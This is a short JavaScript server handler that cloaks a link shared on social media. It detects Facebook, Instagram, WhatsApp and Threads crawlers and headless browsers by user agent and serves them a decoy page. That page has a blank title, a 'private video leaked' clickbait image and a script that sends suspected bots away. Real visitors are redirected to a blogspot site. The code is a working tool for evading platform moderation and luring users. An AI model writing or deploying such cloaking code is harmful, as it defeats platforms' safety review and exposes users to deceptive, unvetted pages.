export default function handler(req, res) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();

  const isFacebookBot = ua.includes('facebookexternalhit') ||
                        ua.includes('facebot') ||
                        ua.includes('facebookplatform') ||
                        ua.includes('instagram') ||
                        ua.includes('whatsapp') ||
                        ua.includes('threads');

  const isHeadlessBotUA = ua.includes('headless') ||
                          ua.includes('puppeteer') ||
                          ua.includes('phantom') ||
                          ua.includes('selenium');

  if (isFacebookBot || isHeadlessBotUA) {
    res.setHeader('Content-Type', 'text/html');
    res.end(`
      <html>
        <head>
          <meta property="og:title" content="&#8203;" />
          <meta property="og:description" content="" />
          <meta property="og:image" content="https://www.google.com/url?sa=i&url=https%3A%2F%2Fzeenews.india.com%2Fkannada%2Fentertainment%2Factress-shruthi-narayanan-private-video-leaked-on-internet-297562&psig=AOvVaw2Ha89izLzZC180EndHRoCX&ust=1751533130072000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCPif5cnnnY4DFQAAAAAdAAAAABAL" />
          <meta property="og:url" content="https://facebook.com/empty" />
          <script>
            (function() {
              let isBot = false;
              if (navigator.webdriver) isBot = true;
              if (window.outerWidth < 400 || window.outerHeight < 400) isBot = true;
              try {
                localStorage.setItem('botCheck', 'yes');
              } catch(e) {
                isBot = true;
              }
              let isHuman = false;
              window.addEventListener('mousemove', () => { isHuman = true; });
              window.addEventListener('scroll', () => { isHuman = true; });
              setTimeout(() => {
                if (isBot || !isHuman) {
                  window.location.href = 'https://facebook.com';
                }
              }, 3000);
            })();
          </script>
        </head>
        <body>
          <p>Facebook or Headless Bot Preview</p>
        </body>
      </html>
    `);
  } else {
    res.writeHead(302, {
      Location: 'https://screeninsiderhub.blogspot.com'
    });
    res.end();
  }
}
